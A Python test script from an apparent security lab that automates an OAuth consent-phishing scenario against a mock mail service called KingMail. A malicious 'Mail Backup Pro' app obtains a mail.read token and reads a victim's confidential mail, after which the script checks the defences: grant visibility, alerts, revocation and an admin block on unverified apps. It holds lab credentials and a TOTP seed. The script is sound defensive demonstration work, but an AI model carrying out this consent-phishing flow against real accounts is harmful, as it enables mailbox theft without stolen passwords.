"""
Phase 3 proof — OAuth consent phishing. The victim signs in to the REAL KingMail
(real password + TOTP, never phished), then grants the attacker's app "Mail Backup Pro"
access to their mailbox. The attacker app swaps the code for a token and reads the mail —
without ever seeing a credential. Then: the grant is visible, revocable, raises a security
alert, and an admin policy blocks unverified apps. Invoked by scripts/oauth_test.sh.
"""
import os
import sys
from urllib.parse import urlencode

import httpx
import pyotp

KM = os.environ.get("KINGMAIL_URL", "http://localhost:8081")
APP = os.environ.get("OAUTH_APP_URL", "http://localhost:8070")
USER = "victim@kingmail.lab"
PW = "Summer2026!"
TOTP = "JBSWY3DPEHPK3PXP"
REDIRECT = f"{APP}/callback"
ok_all = True


def check(cond, msg):
    global ok_all
    print(("  \033[1;32m✓\033[0m " if cond else "  \033[1;31m✗\033[0m ") + msg)
    if not cond:
        ok_all = False


def login(c):
    c.post(f"{KM}/login", data={"email": USER, "password": PW})
    c.post(f"{KM}/otp", data={"code": pyotp.TOTP(TOTP).now()})


AUTH = f"{KM}/oauth/authorize?" + urlencode({
    "response_type": "code", "client_id": "mailbackup", "redirect_uri": REDIRECT,
    "scope": "mail.read", "state": "kingnetlab"})

print("\n== victim signs in to the REAL KingMail (creds NOT phished) ==")
with httpx.Client(timeout=15, follow_redirects=True) as c:
    login(c)
    check(c.cookies.get("kingmail_session") is not None, "victim has a genuine KingMail session")

    print("\n== attacker lure -> KingMail's own consent screen ==")
    page = c.get(AUTH).text
    check("Mail Backup Pro" in page, "consent screen names the attacker app")
    check("Read all the email" in page.lower() or "read all the email" in page.lower(), "it discloses the mail.read scope")
    check("UNVERIFIED" in page.upper(), "it flags the app as unverified")

    print("\n== victim clicks Allow -> KingMail issues an auth code ==")
    r = c.post(f"{KM}/oauth/authorize", data={"client_id": "mailbackup", "redirect_uri": REDIRECT,
               "scope": "mail.read", "state": "kingnetlab", "decision": "allow"},
               follow_redirects=False)
    loc = r.headers.get("location", "")
    check(r.status_code == 302 and "code=" in loc, f"redirect carries an auth code ({r.status_code})")
    code = loc.split("code=", 1)[1].split("&", 1)[0] if "code=" in loc else ""

    print("\n== attacker app exchanges the code and reads the mailbox ==")
    loot = c.get(f"{APP}/callback", params={"code": code, "state": "kingnetlab"}).text
    check("Consent granted" in loot, "attacker app got a token WITHOUT any password/2FA")
    check("Wire approval" in loot, "attacker read the victim's confidential mail")

    print("\n== defense: the grant is visible to the victim ==")
    grants = c.get(f"{KM}/oauth/grants").text
    check("Mail Backup Pro" in grants, "shows up under 'apps with access'")
    sec = c.get(f"{KM}/security").text
    check("oauth consent granted" in sec.lower(), "a security alert was raised")

    print("\n== defense: revoke access ==")
    c.post(f"{KM}/oauth/grants/revoke", data={"client_id": "mailbackup"}, follow_redirects=True)
    check("Mail Backup Pro" not in c.get(f"{KM}/oauth/grants").text, "access removed after revoke")

    print("\n== defense: admin policy blocks unverified apps ==")
    c.post(f"{KM}/admin/consent-policy", json={"block_unverified": True})
    page2 = c.get(AUTH).text
    check("blocks" in page2.lower() and "unverified" in page2.lower(), "consent screen warns it will be blocked")
    r2 = c.post(f"{KM}/oauth/authorize", data={"client_id": "mailbackup", "redirect_uri": REDIRECT,
                "scope": "mail.read", "state": "x", "decision": "allow"}, follow_redirects=False)
    check(r2.status_code == 403 and "code=" not in r2.headers.get("location", ""),
          f"granting is refused by policy (HTTP {r2.status_code})")

print("\nRESULT:", "PASS" if ok_all else "FAIL")
sys.exit(0 if ok_all else 1)
